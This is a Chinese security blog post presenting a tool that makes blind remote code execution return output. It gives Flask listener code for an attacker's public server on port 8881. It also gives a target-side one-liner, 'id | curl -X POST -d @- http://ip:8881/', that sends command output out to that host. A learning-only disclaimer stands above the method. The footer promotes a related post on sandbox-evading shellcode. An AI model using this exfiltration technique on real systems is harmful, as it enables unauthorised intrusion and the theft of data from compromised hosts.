#  工具 ｜ 无回显变可回显rce   
 F12sec   2023-11-26 20:39  
  
> **申明****：本次测试只作为学习用处，请勿未授权进行渗透测试，切勿用于其它用途！**  
  
## 1.漏洞背景  
  
      在网络安全领域，远程代码执行（RCE）漏洞始终是一个引人关注的话题。这类漏洞允许攻击者在目标系统上执行任意代码，往往会带来严重的安全后果。其中，无回显RCE是特别难以诊断和利用的一种情况，因为攻击者无法直接看到他们执行命令的结果。  
  
通过此方法  
将这种无回显的漏洞转变为可回显，这意味着攻击者可以直接观察到他们的操作结果。这一转变大大提高了这类漏洞的利用效率和潜在影响。  
  
使用方法：  
  
1. 服务端安装python，执行pip install flask。  
  
2. 运行server.py  
  
![](https://mmbiz.qpic.cn/mmbiz_png/kq6gvfy0n7piccicBDcml6O3RsSMMSM0RibH4Qem7YSqXEoL3q9WicYOlt9iclgaq0LN7BrZP14iaLiaDUgf8aUlBUUQw/640?wx_fmt=png "")  
  
  
3. 访问公网域名+8881查看是否开启。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/kq6gvfy0n7piccicBDcml6O3RsSMMSM0RibxsQE0SbAk4ILFuZ7Dqd6icQuQg3RZkqVKlBjfAYRZAcUhICiahWK1feg/640?wx_fmt=png "")  
  
  
  
4. 靶机执行命令：  
  
id | curl -X POST -d @- http://ip:8881/  
  
查看回显。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/kq6gvfy0n7piccicBDcml6O3RsSMMSM0RibG9OWycva2FlWVTqZaImkaWMAIfhliaAObBgb2LQRXef6Qs7JmIFhs1Q/640?wx_fmt=png "")  
  
  
开源地址：https://github.com/shanxigetanxiaochou/curl-rce  
ps:回显前提是靶机出网。关键代码展示：```
from flask import Flask, request, render_template

app = Flask(__name__)

# 设置一个文件来保存数据
DATA_FILE = 'data.txt'

@app.route('/', methods=['GET', 'POST'])
def execute():
    if request.method == 'POST':
        # 从 POST 请求中读取数据并保存到文件
        with open(DATA_FILE, 'w') as file:
            file.write(request.get_data(as_text=True))

    # 从文件中读取数据
    data = ''
    try:
        with open(DATA_FILE, 'r') as file:
            data = file.read()
    except FileNotFoundError:
        # 如果文件不存在，则忽略错误
        pass

    # 打印接收到的数据到控制台
    print("Received data:", data)
    res = "结果为：" + data

    # 返回一个包含接收到的数据的 HTML 页面
    return render_template('result.html', received_data=res)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8881)


```  
  
  
  
   
—————————————————————  
- **往期精彩推荐**  
  
[免杀 ｜ 反沙箱运行上线shellcode](http://mp.weixin.qq.com/s?__biz=MzkxMjYxODcyNA==&mid=2247483694&idx=1&sn=71d07d5092e98b921f8c645521928538&chksm=c10b64a5f67cedb3d875d0e4ebfda7a0180c3f53ac419fe0320ade59bb042e8fd61bc30d6bfa&scene=21#wechat_redirect)  
  
## ❤️爱心三连击  
  
1.关注公众号  
「明暗安全」！  
  
2.本文已收录在明暗官方网站：http://www.php1nf0.top/  
  
3.看到这里了就点个关注支持下吧，你的  
「关注」是我创作的动力。  
  
公众号：明暗安全  
  
官方网站：http://www.php1nf0.top/  
  
这是一个终身学习的团队，他们在坚持自己热爱的事情，欢迎加入明暗安全，和师傅们一起开心的挖洞～  
  
        关注和转发是莫大鼓励❤️  
  
  
  
  
  
  
